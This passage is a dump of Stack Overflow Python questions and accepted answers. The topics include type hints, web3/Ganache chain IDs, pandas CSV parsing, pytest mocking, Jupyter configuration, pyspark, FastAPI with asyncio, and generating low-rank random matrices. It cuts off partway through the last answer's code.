</code></pre>
"
"70794199","1","Use of colon ':' in type hints","<p>When type annotating a variable of type dict, typically you'd annotate it like this:</p>
<pre><code>numeralToInteger: dict[str, int] = {...}
</code></pre>
<p>However I rewrote this using a colon instead of a comma:</p>
<pre><code>numeralToInteger: dict[str : int] = {...}
</code></pre>
<p>And this also works, no SyntaxError or NameError is raised.</p>
<p>Upon inspecting the <code>__annotations__</code> global variable:</p>
<pre><code>colon: dict[str : int] = {...}
comma: dict[str, int] = {...}

print(__annotations__)
</code></pre>
<p>The output is:</p>
<pre><code>{'colon': dict[slice(&lt;class 'str'&gt;, &lt;class 'int'&gt;, None)],
 'comma': dict[str, int]}
</code></pre>
<p>So the colon gets treated as a slice object and the comma as a normal type hint.</p>
<p>Should I use the colon with dict types or should I stick with using a comma?</p>
<p>I am using Python version 3.10.1.</p>
","70794389","<p>If you have a dictionary whose keys are strings and values are integers, you should do <code>dict[str, int]</code>. It's not optional. IDEs and type-checkers use these type hints to help you. When you say <code>dict[str : int]</code>, it is a slice object. Totally different things.</p>
<p>Try these in <a href=""https://mypy-play.net/?mypy=latest&amp;python=3.10"" rel=""noreferrer"">mypy playground</a>:</p>
<pre class=""lang-py prettyprint-override""><code>d: dict[str, int]
d = {'hi': 20}

c: dict[str: int]
c = {'hi': 20}
</code></pre>
<p>message:</p>
<pre class=""lang-none prettyprint-override""><code>main.py:4: error: &quot;dict&quot; expects 2 type arguments, but 1 given
main.py:4: error: Invalid type comment or annotation
main.py:4: note: did you mean to use ',' instead of ':' ?
Found 2 errors in 1 file (checked 1 source file)
</code></pre>
<p>Error messages are telling everything</p>
"
"70731492","1","The transaction declared chain ID 5777, but the connected node is on 1337","<p>I am trying to deploy my SimpleStorage.sol contract to a ganache local chain by making a transaction using python. It seems to have trouble connecting to the chain.</p>
<pre><code>from solcx import compile_standard
from web3 import Web3
import json
import os
from dotenv import load_dotenv

load_dotenv()

with open(&quot;./SimpleStorage.sol&quot;, &quot;r&quot;) as file:
    simple_storage_file = file.read()

compiled_sol = compile_standard(
    {
        &quot;language&quot;: &quot;Solidity&quot;,
        &quot;sources&quot;: {&quot;SimpleStorage.sol&quot;: {&quot;content&quot;: simple_storage_file}},
        &quot;settings&quot;: {
            &quot;outputSelection&quot;: {
                &quot;*&quot;: {&quot;*&quot;: [&quot;abi&quot;, &quot;metadata&quot;, &quot;evm.bytecode&quot;, &quot;evm.sourceMap&quot;]}
            }
        },
    },
    solc_version=&quot;0.6.0&quot;,
)

with open(&quot;compiled_code.json&quot;, &quot;w&quot;) as file:
    json.dump(compiled_sol, file)


# get bytecode
bytecode = compiled_sol[&quot;contracts&quot;][&quot;SimpleStorage.sol&quot;][&quot;SimpleStorage&quot;][&quot;evm&quot;][
    &quot;bytecode&quot;
][&quot;object&quot;]


# get ABI
abi = compiled_sol[&quot;contracts&quot;][&quot;SimpleStorage.sol&quot;][&quot;SimpleStorage&quot;][&quot;abi&quot;]

# to connect to ganache blockchain
w3 = Web3(Web3.HTTPProvider(&quot;HTTP://127.0.0.1:7545&quot;))
chain_id = 5777
my_address = &quot;0xca1EA31e644F13E3E36631382686fD471c62267A&quot;
private_key = os.getenv(&quot;PRIVATE_KEY&quot;)


# create the contract in python

SimpleStorage = w3.eth.contract(abi=abi, bytecode=bytecode)

# get the latest transaction
nonce = w3.eth.getTransactionCount(my_address)

# 1. Build a transaction
# 2. Sign a transaction
# 3. Send a transaction


transaction = SimpleStorage.constructor().buildTransaction(
    {&quot;chainId&quot;: chain_id, &quot;from&quot;: my_address, &quot;nonce&quot;: nonce}
)
print(transaction)

</code></pre>
<p>It seems to be connected to the ganache chain because it prints the nonce, but when I build and try to print the transaction
here is the entire traceback call I am receiving</p>
<pre><code>Traceback (most recent call last):
File &quot;C:\Users\evens\demos\web3_py_simple_storage\deploy.py&quot;, line 
52, in &lt;module&gt;
transaction = SimpleStorage.constructor().buildTransaction(
File &quot;C:\Python310\lib\site-packages\eth_utils\decorators.py&quot;, line 
18, in _wrapper
return self.method(obj, *args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\contract.py&quot;, line 684, in buildTransaction
return fill_transaction_defaults(self.web3, built_transaction)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\_utils\transactions.py&quot;, line 114, in 
fill_transaction_defaults
default_val = default_getter(web3, transaction)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\_utils\transactions.py&quot;, line 60, in &lt;lambda&gt;
'gas': lambda web3, tx: web3.eth.estimate_gas(tx),
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\eth.py&quot;, line 820, in estimate_gas
return self._estimate_gas(transaction, block_identifier)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\module.py&quot;, line 57, in caller
result = w3.manager.request_blocking(method_str,
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\manager.py&quot;, line 197, in request_blocking
response = self._make_request(method, params)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\manager.py&quot;, line 150, in _make_request
return request_func(method, params)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\formatting.py&quot;, line 76, in 
apply_formatters
response = make_request(method, params)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\gas_price_strategy.py&quot;, line 90, in 
middleware
return make_request(method, params)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\formatting.py&quot;, line 74, in 
apply_formatters
response = make_request(method, formatted_params)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\attrdict.py&quot;, line 33, in middleware
response = make_request(method, params)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\formatting.py&quot;, line 74, in 
apply_formatters
response = make_request(method, formatted_params)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\formatting.py&quot;, line 73, in 
apply_formatters
formatted_params = formatter(params)
File &quot;cytoolz/functoolz.pyx&quot;, line 503, in 
cytoolz.functoolz.Compose.__call__
ret = PyObject_Call(self.first, args, kwargs)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Python310\lib\site-packages\eth_utils\decorators.py&quot;, line 
91, in wrapper
return ReturnType(result)  # type: ignore
File &quot;C:\Python310\lib\site-packages\eth_utils\applicators.py&quot;, line 
22, in apply_formatter_at_index
yield formatter(item)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Python310\lib\site-packages\eth_utils\applicators.py&quot;, line 
72, in apply_formatter_if
return formatter(value)
File &quot;cytoolz/functoolz.pyx&quot;, line 250, in 
cytoolz.functoolz.curry.__call__
return self.func(*args, **kwargs)
File &quot;C:\Users\evens\AppData\Roaming\Python\Python310\site- 
packages\web3\middleware\validation.py&quot;, line 57, in 
validate_chain_id
raise ValidationError(
web3.exceptions.ValidationError: The transaction declared chain ID 
5777, but the connected node is on 1337
</code></pre>
","70745821","<p>Had this issue myself, apparently it's some sort of Ganache CLI error but the simplest fix I could find was to change the network id in Ganache through settings&gt;server to 1337. It restarts the session so you'd then need to change the address and private key variable.</p>
<p>If it's the same tutorial I'm doing, you're likely to come unstuck after this... the code for transaction should be:</p>
<pre><code>transaction = 
 SimpleStorage.constructor().buildTransaction( {
    &quot;gasPrice&quot;: w3.eth.gas_price, 
    &quot;chainId&quot;: chain_id, 
    &quot;from&quot;: my_address, 
    &quot;nonce&quot;: nonce, 
})
print(transaction)
</code></pre>
<p>Otherwise you get a value error if you don't set the gasPrice</p>
"
"70753091","1","*Why* does object() not support `setattr`, but derived classes do?","<p>Today I stumbled upon the following behaviour:</p>
<pre class=""lang-py prettyprint-override""><code>class myobject(object):
    &quot;&quot;&quot;Should behave the same as object, right?&quot;&quot;&quot;

obj = myobject()
obj.a = 2        # &lt;- works
obj = object()
obj.a = 2        # AttributeError: 'object' object has no attribute 'a'
</code></pre>
<p>I want to know what is the logic behind designing the language to behave this way, because it feels utterly paradoxical to me. It breaks my intuition that if I create a subclass, without modification, it should behave the same as the parent class.</p>
<hr />
<p><strong>EDIT:</strong> A lot of the answers suggest that this is because we want to be able to write classes that work with <code>__slots__</code> instead of <code>__dict__</code> for performance reasons. However, we can do:</p>
<pre class=""lang-py prettyprint-override""><code>class myobject_with_slots(myobject):
    __slots__ = (&quot;x&quot;,)
    
obj = myobject_with_slots()
obj.x = 2
obj.a = 2
assert &quot;a&quot; in obj.__dict__      # ✔
assert &quot;x&quot; not in obj.__dict__  # ✔
</code></pre>
<p>So it seems we can have both <code>__slots__</code> and <code>__dict__</code> at the same time, so why doesn't <code>object</code> allow both, but one-to-one subclasses do?</p>
","70753129","<p>Because derived classes do not necessarily support <code>setattr</code> either.</p>
<pre class=""lang-py prettyprint-override""><code>class myobject(object):
    &quot;&quot;&quot;Should behave the same as object!&quot;&quot;&quot;
    __slots__ = ()

obj = myobject()
obj.a = 2        # &lt;- works the same as for object
</code></pre>
<p>Since all types derive from <code>object</code>, most builtin types such as <code>list</code> are also examples.</p>
<p>Arbitrary attribute assignment is something that <code>object</code> subclasses <em>may</em> support, but not all do. Thus, <a href=""https://en.wikipedia.org/wiki/Liskov_substitution_principle"" rel=""nofollow noreferrer"">the common base class does not support this either</a>.</p>
<hr />
<p><a href=""https://docs.python.org/3/library/stdtypes.html#object.__dict__"" rel=""nofollow noreferrer"">Support for arbitrary attributes is commonly backed by the so-called <code>__dict__</code> slot.</a> This is a fixed attribute that contains a literal <code>dict</code> <sup>1</sup> to store any attribute-value pairs.</p>
<p>In fact, one can manually define the <code>__dict__</code> slot to get arbitrary attribute support.</p>
<pre class=""lang-py prettyprint-override""><code>class myobject(object):
    &quot;&quot;&quot;Should behave the same as object, right?&quot;&quot;&quot;
    __slots__ = (&quot;__dict__&quot;,)

obj = myobject()
obj.a = 2            # &lt;- works!
print(obj.__dict__)  # {'a': 2}
</code></pre>
<p>The takeaway from this demonstration is that <em>fixed</em> attributes is actually the &quot;base behaviour&quot; of Python; the <em>arbitrary</em> attributes support is built on top <em>when required</em>.</p>
<p>Adding arbitrary attributes for <code>object</code> subtypes by default provides a simpler programming experience. However, still supporting fixed attributes for <code>object</code> subtypes allows for better memory usage and performance.</p>
<blockquote>
<h4><a href=""https://docs.python.org/3/reference/datamodel.html#slots"" rel=""nofollow noreferrer"">Data Model: <code>__slots__</code></a></h4>
<p>The space saved [by <code>__slots__</code>] over using <code>__dict__</code> can be significant. Attribute lookup speed can be significantly improved as well.</p>
</blockquote>
<p>Note that it is possible to define classes with both fixed attributes and arbitrary attributes. The fixed attributes will benefit from the improved memory layout and performance; since they are not stored in the <code>__dict__</code>, its memory overhead<sup>2</sup> is lower – but it still costs.</p>
<hr />
<p><sup>1</sup>Python implementations may use different, optimised types  for <code>__dict__</code> as long as they <em>behave</em> like a <code>dict</code>.</p>
<p><sup>2</sup>For its hash-based lookup to work efficiently with few collisions, a <code>dict</code> must be <em>larger</em> than the number of items it stores.</p>
"
"70967266","1","what exactly is python typing.Callable?","<p>I have seen <code>typing.Callable</code>, but I didn't find any useful docs about it. What exactly is <code>typing.Callable</code>?</p>
","70967371","<p><a href=""https://docs.python.org/3/library/typing.html#typing.Callable"" rel=""noreferrer""><code>typing.Callable</code></a> is the type you use to indicate a <a href=""https://docs.python.org/3/library/functions.html#callable"" rel=""noreferrer"">callable</a>. Most python types that support the <code>()</code> operator are of the type <a href=""https://docs.python.org/3/library/collections.abc.html#collections.abc.Callable"" rel=""noreferrer""><code>collections.abc.Callable</code></a>. Examples include functions, <a href=""https://docs.python.org/3/library/functions.html#classmethod"" rel=""noreferrer""><code>classmethod</code></a>s, <a href=""https://docs.python.org/3/library/functions.html#staticmethod"" rel=""noreferrer""><code>staticmethod</code></a>s, bound methods and lambdas.</p>
<p>In summary, anything with a <code>__call__</code> method (which is how <code>()</code> is implemented), is a callable.</p>
<p><a href=""https://www.python.org/dev/peps/pep-0677/"" rel=""noreferrer"">PEP 677</a> attempted to introduce implicit tuple-with-arrow syntax, so that something like <code>Callable[[int, str], list[float]]</code> could be expressed much more intuitively as <code>(int, str) -&gt; list[float]</code>. The PEP was rejected because the benefits of the new syntax were not deemed sufficient given the added maintenance burden and possible room for confusion.</p>
"
"70801888","1","Ignore the first space in CSV","<p>I have a CSV file like this:</p>
<pre><code>Time              Latitude Longitude
2021-09-12 23:13    44.63     -63.56
2021-09-14 23:13    43.78     -62
2021-09-16 23:14    44.83     -54.6
</code></pre>
<p><code>2021-09-12 23:13</code> is under <code>Time</code> column.</p>
<p>I would like to open it using pandas. But there is a problem with the first column. It contains a space. If I open it using:</p>
<pre><code>import pandas as pd
points = pd.read_csv(&quot;test.csv&quot;, delim_whitespace=True) 
</code></pre>
<p>I get</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th></th>
<th>Time</th>
<th>Latitude</th>
<th>Longitude</th>
</tr>
</thead>
<tbody>
<tr>
<td>2021-09-12</td>
<td>23:13</td>
<td>44.630</td>
<td>-63.560</td>
</tr>
<tr>
<td>2021-09-14</td>
<td>23:13</td>
<td>43.780</td>
<td>-62.000</td>
</tr>
<tr>
<td>2021-09-16</td>
<td>23:14</td>
<td>44.830</td>
<td>-54.600</td>
</tr>
</tbody>
</table>
</div>
<p>But I would like to skip the space in the first column in CSV (<code>2021-09-12 23:13</code> should be under <code>Time</code> column) like:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th></th>
<th>Time</th>
<th>Latitude</th>
<th>Longitude</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>2021-09-12 23:13</td>
<td>44.630</td>
<td>-63.560</td>
</tr>
<tr>
<td>1</td>
<td>2021-09-14 23:13</td>
<td>43.780</td>
<td>-62.000</td>
</tr>
<tr>
<td>2</td>
<td>2021-09-16 23:14</td>
<td>44.830</td>
<td>-54.600</td>
</tr>
</tbody>
</table>
</div>
<p>How can I ignore the first space when using <code>pd.read_csv</code>?</p>
<p>Please do not stick to this csv file. This is a general question to skip (not to consider as a delimiter) the first space(s) in the first column. Because everyone knows that the first space is part of the time value, not a delimiter.</p>
","70834357","<p>Ideally you should be parsing the first two parts as a datetime. By using a space as a delimiter, it would imply the header has three columns. The space after the date though is being seen as an extra column.</p>
<p>A workaround is to skip the header entirely and supply your own column names. The <code>parse_dates</code> parameter can be used to tell Pandas to parse the first two columns as a single combined datetime object.</p>
<p>For example:</p>
<pre><code>import pandas as pd

points = pd.read_csv(&quot;test.csv&quot;, delimiter=&quot; &quot;, 
    skipinitialspace=True, skiprows=1, index_col=None, 
    parse_dates=[[0, 1]], names=[&quot;Date&quot;, &quot;Time&quot;, &quot;Latitude&quot;, &quot;Longitude&quot;])

print(points)
</code></pre>
<p>Should give you the following dataframe:</p>
<pre><code>            Date_Time  Latitude  Longitude
0 2021-09-12 23:13:00     44.63     -63.56
1 2021-09-14 23:13:00     43.78     -62.00
2 2021-09-16 23:14:00     44.83     -54.60
</code></pre>
"
"70888992","1","unittest.mock vs mock vs mocker vs pytest-mock","<p>I am new to Python development, I am writing test cases using <strong>pytest</strong> where I need to mock some behavior. Googling <em>best mocking library for pytest,</em> has only confused me. I have seen unittest.mock, mock, mocker and pytest-mock. Not really sure which one to use.Can someone please explain me the difference between them and also recommend me one?</p>
","70889128","<p>So pytest-mock is a thin wrapper around mock and mock is since python 3.3. actually the same as unittest.mock. I don't know if mocker is another library, I only know it as the name of the fixture provided by pytest-mock to get mocking done in your tests. I personally use pytest and pytest-mock for my tests, which allows you to write very concise tests like</p>
<pre class=""lang-py prettyprint-override""><code>from pytest_mock import MockerFixture
@pytest.fixture(autouse=True)
def something_to_be_mocked_everywhere(mocker):
    mocker.patch()


def tests_this(mocker: MockerFixture):
    mocker.patch ...
    a_mock = mocker.Mock() ...
    ...
</code></pre>
<p>But this is mainly due to using fixtures, which is already pointed out is what pytest-mock offers.</p>
"
"70753768","1","Jupyter Notebook: Access to the file was denied","<p>I'm trying to run a Jupyter notebook on Ubuntu 21.10. I've installed python, jupyter notebook, and all the various prerequisites. I added <code>export PATH=$PATH:~/.local/bin</code> to my <code>bashrc</code> so that the command <code>jupyter notebook</code> would be operational from the terminal.</p>
<p>When I call <code>jupyter notebook</code> from the terminal, I get the following error message from my browser:</p>
<pre><code>Access to the file was denied.

The file at /home/username/.local/share/jupyter/runtime/nbserver-260094-open.html is not readable.

    It may have been removed, moved, or file permissions may be preventing access.
</code></pre>
<p>I'm using the latest version of FireFox.</p>
<p>I've read a number of guides on this and it seems to be a permissions error, but none of the guides that I've used have resolved the issue. Using <code>sudo</code> does not help, in fact it causes <code>Exception: Jupyter command &quot;jupyter-notebook&quot; not found.</code> to be thrown.</p>
<p>That being said, I am still able to access the notebook server. If I go to the terminal and instead click on the <code>localhost:8888</code> or IP address of the notebook server then it takes me to the notebook and everything runs without issue.</p>
<p>I would like to solve this so that when I run <code>jupyter notebook</code> I'm taken to the server and don't need to go back to the terminal window and click the IP address. It's inconvenient and can slow me down if I'm running multiple notebooks at once.</p>
<p>Any help on this issue would be greatly appreciated!</p>
","70753901","<p>I had the same problem.</p>
<p>Ubuntu 20.04.3 LTS
Chromium Version 96.0.4664.110</p>
<p>This was the solution in my case:</p>
<p>Create the configuration file with this command:</p>
<pre><code>jupyter notebook --generate-config
</code></pre>
<p>Edit the configuration file <code>~/.jupyter/jupyter_notebook_config.py</code> and set:</p>
<pre class=""lang-py prettyprint-override""><code>c.NotebookApp.use_redirect_file = False
</code></pre>
<p>Make sure that this configuration parameter starts at the beginning of the line. If you leave one space at the beginning of the line, you will get the message that access to the file was denied.</p>
<p><strong>Otherwise</strong> you can clean and reinstall JupyterLab</p>
<pre><code>jupyter lab clean --all
pip3 install jupyterlab --force-reinstall
</code></pre>
"
"70894409","1","pyspark get element from array Column of struct based on condition","<p>I have a spark df with the following schema:</p>
<pre class=""lang-none prettyprint-override""><code> |-- col1 : string
 |-- col2 : string
 |-- customer: struct
 |    |-- smt: string
 |    |-- attributes: array (nullable = true)
 |    |    |-- element: struct
 |    |    |     |-- key: string
 |    |    |     |-- value: string
</code></pre>
<p>df:</p>
<pre class=""lang-none prettyprint-override""><code>#+-------+-------+---------------------------------------------------------------------------+
#|col1   |col2   |customer                                                                   |
#+-------+-------+---------------------------------------------------------------------------+
#|col1_XX|col2_XX|&quot;attributes&quot;:[[{&quot;key&quot;: &quot;A&quot;, &quot;value&quot;: &quot;123&quot;},{&quot;key&quot;: &quot;B&quot;, &quot;value&quot;: &quot;456&quot;}]  |
#+-------+-------+---------------------------------------------------------------------------+
</code></pre>
<p>and the json input for the array look like this:</p>
<pre class=""lang-json prettyprint-override""><code>...
          &quot;attributes&quot;: [
            {
              &quot;key&quot;: &quot;A&quot;,
              &quot;value&quot;: &quot;123&quot;
            },
            {
              &quot;key&quot;: &quot;B&quot;,
              &quot;value&quot;: &quot;456&quot;
            }
          ],
</code></pre>
<p>I would like to loop attributes array and get the element with <code>key=&quot;B&quot;</code> and then select the corresponding <code>value</code>. I don't want to use explode because I would like to avoid join dataframes.
Is it possible to perform this kind of operation directly using spark 'Column' ?</p>
<p>Expected output will be:</p>
<pre class=""lang-none prettyprint-override""><code>#+-------+-------+-----+
#|col1   |col2   |B    |                                                               |
#+-------+-------+-----+
#|col1_XX|col2_XX|456  |
#+-------+-------+-----+
</code></pre>
<p>any help would be appreciated</p>
","70895004","<p>You can use <code>filter</code> function to filter the array of structs then get <code>value</code>:</p>
<pre><code>from pyspark.sql import functions as F

df2 = df.withColumn(
    &quot;B&quot;, 
    F.expr(&quot;filter(customer.attributes, x -&gt; x.key = 'B')&quot;)[0][&quot;value&quot;]
)
</code></pre>
"
"71500756","1","What is Python's ""Namespace"" object?","<p>I know what namespaces are. But when running</p>
<pre><code>import argparse
parser = argparse.ArgumentParser()
parser.add_argument('bar')
parser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')
</code></pre>
<p>What kind of object is <code>Namespace(bar='XXX')</code>? I find this totally confusing.</p>
<p>Reading the argparse docs, it says &quot;Most ArgumentParser actions add some value as an attribute of the object returned by parse_args()&quot;.  Shouldn't this object then appear when running <code>globals()</code>? Or how can I introspect it?</p>
","71500890","<p>Samwise's answer is very good, but let me answer the other part of the question.</p>
<blockquote>
<p>Or how can I introspect it?</p>
</blockquote>
<p>Being able to introspect objects is a valuable skill in any language, so let's approach this as though <code>Namespace</code> is a completely unknown type.</p>
<pre><code>&gt;&gt;&gt; obj = parser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')
</code></pre>
<p>Your first instinct is good. See if there's a <code>Namespace</code> in the global scope, which there isn't.</p>
<pre><code>&gt;&gt;&gt; Namespace
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
NameError: name 'Namespace' is not defined
</code></pre>
<p>So let's see the actual type of the thing. The <code>Namespace(bar='XXX')</code> printer syntax is coming from a <code>__str__</code> or <code>__repr__</code> method somewhere, so let's see what the type <em>actually</em> is.</p>
<pre><code>&gt;&gt;&gt; type(obj)
&lt;class 'argparse.Namespace'&gt;
</code></pre>
<p>and its module</p>
<pre><code>&gt;&gt;&gt; type(obj).__module__
'argparse'
</code></pre>
<p>Now it's a pretty safe bet that we can do <code>from argparse import Namespace</code> and get the type. Beyond that, we can do</p>
<pre><code>&gt;&gt;&gt; help(argparse.Namespace)
</code></pre>
<p>in the interactive interpreter to get detailed documentation on the <code>Namespace</code> class, all with no Internet connection necessary.</p>
"
"70854314","1","Use FastAPI to interact with async loop","<p>I am running coroutines of 'workers' whose job it is to wait 5s, get values from an asyncio.Queue() and print them out continually.</p>
<pre><code>q = asyncio.Queue()

def worker():
    while True:
        await asyncio.sleep(5)
        i = await q.get()
        print(i)
        q.task_done()

async def main(q):
    workers = [asyncio.create_task(worker()) for n in range(10)]
    await asyncio.gather(*workers)


if __name__ == &quot;__main__&quot;:
    asyncio.run(main())
</code></pre>
<p>I would like to be able to interact with the queue through http requests using FastAPI. For example POST requests that would 'put' items in the queue for the workers to print.</p>
<p>I'm unsure how I can run the coroutines of the workers concurrently with FastAPI to achieve this effect. Uvicorn has its own event loop I believe and my attempts to use asyncio methods have been unsuccessful.</p>
<p>The router would look something like this I think.</p>
<pre><code>@app.post(&quot;/&quot;)
async def put_queue(data:str):
    return q.put(data)
</code></pre>
<p>And I'm hoping there's something that would have an effect like this:</p>
<pre><code>await asyncio.gather(main(),{FastApi() app run})
</code></pre>
","70900417","<p>One option would be to add a task that wraps your main coroutine in <a href=""https://fastapi.tiangolo.com/advanced/events/"" rel=""noreferrer"">a on startup event</a></p>
<pre class=""lang-py prettyprint-override""><code>import asyncio
@app.on_event(&quot;startup&quot;)
async def startup_event():
    asyncio.create_task(main())

</code></pre>
<p>This would schedule your main coroutine before the app has been fully started.</p>
<p>Important here is that you don't await the created task as it would basically block startup_event forever</p>
"
"70836912","1","Use mysql.connector , but get ImportError: Missing optional dependency 'SQLAlchemy'","<p>I work on a program for two months.
Today I suddenly got an error when connecting to the database while using mysql.connector.</p>
<p>Interestingly, this error is not seen when running previous versions.</p>
<pre><code>import mysql.connector
import pandas as pd

mydb = mysql.connector.connect(host=&quot;localhost&quot;, user=&quot;root&quot;, password=&quot;*****&quot;, 
database=&quot;****&quot;)

Q = f'SELECT * FROM table'
df = pd.read_sql_query(Q, con=mydb)

print(df)
</code></pre>
<p>but I get this error :</p>
<pre><code>Traceback (most recent call last):
df = pd.read_sql_query(Q, con=mydb)
File &quot;g.v1.6\venv\lib\site-packages\pandas\io\sql.py&quot;, line 
398, in read_sql_query
pandas_sql = pandasSQL_builder(con)
File &quot;g.v1.6\venv\lib\site-packages\pandas\io\sql.py&quot;, line 
750, in pandasSQL_builder
sqlalchemy = import_optional_dependency(&quot;sqlalchemy&quot;)
File &quot;g.v1.6\venv\lib\site- 
packages\pandas\compat\_optional.py&quot;, line 129, in import_optional_dependency
raise ImportError(msg)
ImportError: Missing optional dependency 'SQLAlchemy'.  Use pip or conda to install 
SQLAlchemy.
</code></pre>
<p>What has this got to do with SQLAlchemy??</p>
","70852553","<p>I just ran into something similar. It looks like Pandas 1.4 was released on January 22, 2022:
<a href=""https://pandas.pydata.org/docs/dev/whatsnew/v1.4.0.html"" rel=""noreferrer"">https://pandas.pydata.org/docs/dev/whatsnew/v1.4.0.html</a></p>
<p>It has an &quot;optional&quot; dependency on SQLAlchemy, which is required to communicate with any database other than sqlite now, as the comment by snakecharmerb mentioned. Once I added that to my requirements and installed SQLAlchemy, it resolved my problem.</p>
"
"70982008","1","VSCode pytest discovery not working: conda error?","<p>I'm having a strange problem with VSCode's python testing functionality. When I try to discover tests I get the following error:</p>
<pre><code>&gt; conda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear .
cwd: .
[ERROR 2022-1-3 21:49:47.851]: Error discovering pytest tests:
 [r [Error]: 
EnvironmentLocationNotFound: Not a conda environment: /Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox
</code></pre>
<p>But obviously there's a duplication error: <code>/Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox</code>.</p>
<p>If I run this command directly in the terminal I get the expected output and no errors:</p>
<pre><code>conda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear
</code></pre>
<p>I'm completely stumped as there doesn't seem to be any settings that would affect this.</p>
<p>I tried reinstalling VSCode from scratch (after removing all the local files) same with conda.</p>
","70982213","<p>Two ways I've found to fix:</p>
<ol>
<li>Change the name of the <code>conda</code> environment. Just cloning <code>sandbox</code> to <code>boxsand</code> did the trick</li>
<li>Add <code>python.condaPath</code> variable to VSCode's preferences</li>
</ol>
"
"70750396","1","How to generate a Rank 5 matrix with entries Uniform?","<p>I want to generate a rank 5 100x600 matrix in numpy with all the entries sampled from np.random.uniform(0, 20), so that all the entries will be uniformly distributed between [0, 20). What will be the best way to do so in python?</p>
<p>I see there is an SVD-inspired way to do so here (<a href=""https://math.stackexchange.com/questions/3567510/how-to-generate-a-rank-r-matrix-with-entries-uniform"">https://math.stackexchange.com/questions/3567510/how-to-generate-a-rank-r-matrix-with-entries-uniform</a>), but I am not sure how to code it up. <strong>I am looking for a working example of this SVD-inspired way to get uniformly distributed entries.</strong></p>
<p>I have actually managed to code up a rank 5 100x100 matrix by vertically stacking five 20x100 rank 1 matrices, then shuffling the vertical indices. However, the resulting 100x100 matrix does not have uniformly distributed entries [0, 20).</p>
<p>Here is my code (my best attempt):</p>
<pre><code>import numpy as np
def randomMatrix(m, n, p, q):
    # creates an m x n matrix with lower bound p and upper bound q, randomly.
    count = np.random.uniform(p, q, size=(m, n))
    return count

Qs = []
my_rank = 5
for i in range(my_rank):
  L = randomMatrix(20, 1, 0, np.sqrt(20))
  # L is tall
  R = randomMatrix(1, 100, 0, np.sqrt(20)) 
  # R is long
  Q = np.outer(L, R)
  Qs.append(Q)

Q = np.vstack(Qs)
#shuffle (preserves rank 5 [confirmed])
np.random.shuffle(Q)

</code></pre>
","70964065","<p>I just couldn't take the fact the my previous solution (the &quot;selection&quot; method) did not really produce strictly uniformly distributed entries, but only close enough to fool a statistical test sometimes. The asymptotical case however, will almost surely not be distributed uniformly. But I did dream up another crazy idea that's just as bad, but in another manner - it's not really random.<br />
In this solution, I do smth similar to OP's method of forming R matrices with rank 1 and then concatenating them but a little differently. I create each matrix by stacking a base vector on top of itself multiplied by 0.5 and then I stack those on the same base vector shifted by half the dynamic range of the uniform distribution. This process continues with multiplication by a third, two thirds and 1 and then shifting and so on until i have the number of required vectors in that part of the matrix.<br />
I know it sounds incomprehensible. But, unfortunately, I couldn't find a way to explain it better. Hopefully, reading the code would shed some more light.<br />
I hope this &quot;staircase&quot; method will be more reliable and useful.</p>
<pre><code>import numpy as np 
from matplotlib import pyplot as plt

'''
params:
    N    - base dimention
    M    - matrix length
    R    - matrix rank
    high - max value of matrix
    low  - min value of the matrix
'''
N    = 100
M    = 600
R    = 5
high = 20
low  = 0

# base vectors of the matrix
base = low+np.random.rand(R-1, N)*(high-low)

def build_staircase(base, num_stairs, low, high):
    '''
    create a uniformly distributed matrix with rank 2 'num_stairs' different 
    vectors whose elements are all uniformly distributed like the values of 
    'base'.
    '''
    l = levels(num_stairs)
    vectors = []
    for l_i in l:
        for i in range(l_i):
            vector_dynamic = (base-low)/l_i
